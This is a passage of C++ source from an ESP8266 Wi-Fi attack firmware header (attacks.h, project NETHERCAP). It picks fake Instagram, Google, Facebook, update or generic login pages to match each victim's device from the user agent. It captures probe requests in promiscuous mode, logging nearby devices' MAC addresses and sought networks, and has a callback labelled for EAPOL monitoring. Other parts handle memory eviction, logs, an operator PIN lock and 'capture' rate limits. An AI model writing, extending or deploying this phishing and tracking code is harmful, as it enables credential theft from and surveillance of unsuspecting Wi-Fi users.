OP-AMINUL-FF/OPX_my_demon/NETHERCAP_ESP8266/attacks.h
static bool isMobile(const String& userAgent) {
  String ua = userAgent;
  ua.toLowerCase();
  return ua.indexOf("mobile") >= 0 || ua.indexOf("iphone") >= 0 || ua.indexOf("android") >= 0;
}

static uint8_t autoSelectPhishingPage(const String& userAgent, uint8_t currentSetting) {
  if (currentSetting != PHISHING_LANDING && currentSetting != PHISHING_CUSTOM) {
    return currentSetting;
  }
  ClientOS os = detectOS(userAgent);
  if (isMobile(userAgent)) {
    return PHISHING_INSTAGRAM;
  }
  switch (os) {
    case OS_IOS:    return PHISHING_UPDATE;
    case OS_ANDROID: return PHISHING_GOOGLE;
    case OS_WINDOWS: return PHISHING_FACEBOOK;
    default:        return PHISHING_GENERIC;
  }
}

// --- Dynamic Resource Management (Heap-Aware) ---
static void lruEvictProbes() {
  if (probeCount < PROBE_MAX / 2) return;
  int oldest = 0;
  for (int i = 1; i < probeCount; i++) {
    if (probeLog[i].time < probeLog[oldest].time) oldest = i;
  }
  for (int i = oldest; i < probeCount - 1; i++) probeLog[i] = probeLog[i + 1];
  probeCount--;
}

static void lruEvictClients() {
  if (clientCount < CLIENT_MAX / 2) return;
  int oldest = 0;
  for (int i = 1; i < clientCount; i++) {
    if (clientList[i].time < clientList[oldest].time) oldest = i;
  }
  for (int i = oldest; i < clientCount - 1; i++) clientList[i] = clientList[i + 1];
  clientCount--;
}

// --- Log Levels Optimized ---
#define LOG_MAX 100
#define LOG_BUFFER_MAX 8192
struct LogEntry {
  unsigned long timestamp;
  uint8_t level;
  String message;
};
LogEntry logEntries[LOG_MAX];
int logCount = 0;
int logHead = 0;
unsigned long lastLogFlush = 0;
String logBuffer = "";
unsigned int logBufferSize = 0;

static bool heapLowPressure() {
  return ESP.getFreeHeap() < HEAP_WARNING_THRESHOLD + 2000;
}

static void heapPressureEvict() {
  if (!heapLowPressure()) return;
  if (probeCount > 10) { probeCount = max(10, probeCount - 20); addLog("Heap pressure: evicted probes", LOG_WARN); }
  if (clientCount > 10) { clientCount = max(10, clientCount - 10); addLog("Heap pressure: evicted clients", LOG_WARN); }
  if (logCount > 10) { logCount = 10; addLog("Heap pressure: evicted logs", LOG_WARN); }
  if (dnsLogCount > 10) { dnsLogCount = 10; }
}

// --- PIN Lock State ---
String webPin = "";
int pinAttempts = 0;
unsigned long pinLockoutUntil = 0;
bool pinUnlocked = false;
unsigned long pinUnlockTime = 0;
#define PIN_SESSION_MS 300000

// --- Rate Limiting ---
unsigned long lastCaptureTime = 0;
int captureCountThisMin = 0;
unsigned long captureMinStart = 0;

// --- Heap Tracking ---
size_t heapLowMark = 0xFFFFFFFF;
unsigned long lastHeapCheck = 0;

static void updateHeapLowMark() {
  size_t current = ESP.getFreeHeap();
  if (current < heapLowMark) heapLowMark = current;
}

String htmlEntities(String input) {
  input.replace("&", "&amp;");
  input.replace("<", "&lt;");
  input.replace(">", "&gt;");
  input.replace("\"", "&quot;");
  input.replace("'", "&#39;");
  return input;
}

void addLog(String msg, uint8_t level) {
  int idx;
  if (logCount < LOG_MAX) {
    idx = logCount;
    logCount++;
  } else {
    idx = logHead;
    logHead = (logHead + 1) % LOG_MAX;
  }
  logEntries[idx].timestamp = millis();
  logEntries[idx].level = level;
  logEntries[idx].message = msg;

  unsigned long t = millis() / 1000;
  char timeStr[24];
  int n = snprintf(timeStr, sizeof(timeStr), "[%lum %lus]", (unsigned long)(t/60), (unsigned long)(t%60));
  if (n < 0 || n >= (int)sizeof(timeStr)) timeStr[sizeof(timeStr)-1] = '\0';
  String levelStr = (level == LOG_ERR) ? "[ERR]" : (level == LOG_WARN) ? "[WARN]" : "[INFO]";
  String formatted = String(timeStr) + levelStr + " " + msg + "\n";
  
  if (logBufferSize + formatted.length() > LOG_BUFFER_MAX) {
    logBuffer = formatted;
    logBufferSize = formatted.length();
  } else {
    logBuffer += formatted;
    logBufferSize += formatted.length();
  }
  
  if (logBufferSize >= LOG_BUFFER_MAX / 2) flushLogs();
  
  updateHeapLowMark();
}

bool flushLogs() {
  if (logBuffer.length() == 0) return true;
  unsigned long fsize = 0;
  if (LittleFS.exists("/log.txt")) {
    File cf = LittleFS.open("/log.txt", "r");
    if (cf) { fsize = cf.size(); cf.close(); }
  }
  if (fsize > LOG_FILE_MAX_SIZE) {
    LittleFS.remove("/log.txt");
  }
  File f = LittleFS.open("/log.txt", "a");
  if (!f) return false;
  size_t written = f.print(logBuffer);
  f.close();
  logBuffer = "";
  logBufferSize = 0;
  lastLogFlush = millis();
  return written > 0;
}

String getLogsHTML() {
  String html;
  File logFile = LittleFS.open("/log.txt", "r");
  if (logFile) {
    while (logFile.available()) {
      String line = logFile.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) {
        String cls = "capture-box";
        if (line.indexOf("[ERR]") >= 0) cls = "capture-box" + String(" red");
        else if (line.indexOf("[WARN]") >= 0) cls = "capture-box";
        html += "<div class='" + cls + "'>" + htmlEntities(line) + "</div>";
      }
    }
    logFile.close();
  }
  if (html.length() == 0) html = "<div class='empty'>No logs yet</div>";
  return html;
}

String getLogsJSON() {
  String json = "[";
  for (int i = 0; i < logCount; i++) {
    if (i > 0) json += ",";
    json += "{\"t\":" + String(logEntries[i].timestamp / 1000) + ",\"l\":" + String(logEntries[i].level) + ",\"m\":\"" + logEntries[i].message + "\"}";
  }
  json += "]";
  return json;
}

// --- Promiscuous Callback for Probe + EAPOL Monitoring ---
void promiscuousCallback(uint8_t *buf, uint16_t len) {
  if (len < 26) return;
  uint8_t frameType = buf[0] & 0xFC;

  // --- Probe Request Detection (type 0x40 = probe req) ---
  if (frameType == 0x40) {
    uint8_t mac[MAC_LEN];
    memcpy(mac, &buf[10], MAC_LEN);

    int ssidLen = buf[25];
    if (ssidLen > SSID_MAX_LEN) ssidLen = SSID_MAX_LEN;
    int remaining = len - 26;
    if (ssidLen > remaining) ssidLen = remaining;
    String ssid = "";
    for (int i = 0; i < ssidLen; i++) {
      ssid += (char)buf[26 + i];
    }

    for (int i = 0; i < probeCount; i++) {
      if (memcmp(probeLog[i].mac, mac, 6) == 0 && probeLog[i].ssid == ssid) {
        probeLog[i].time = millis();
        return;
      }
    }

    if (probeCount < PROBE_MAX) {
      memcpy(probeLog[probeCount].mac, mac, 6);
      probeLog[probeCount].ssid = ssid;
      probeLog[probeCount].time = millis();
      probeCount++;
    } else {
      for (int i = 1; i < PROBE_MAX; i++) probeLog[i-1] = probeLog[i];
      memcpy(probeLog[PROBE_MAX-1].mac, mac, 6);
      probeLog[PROBE_MAX-1].ssid = ssid;
      probeLog[PROBE_MAX-1].time = millis();
    }
    return;
  }

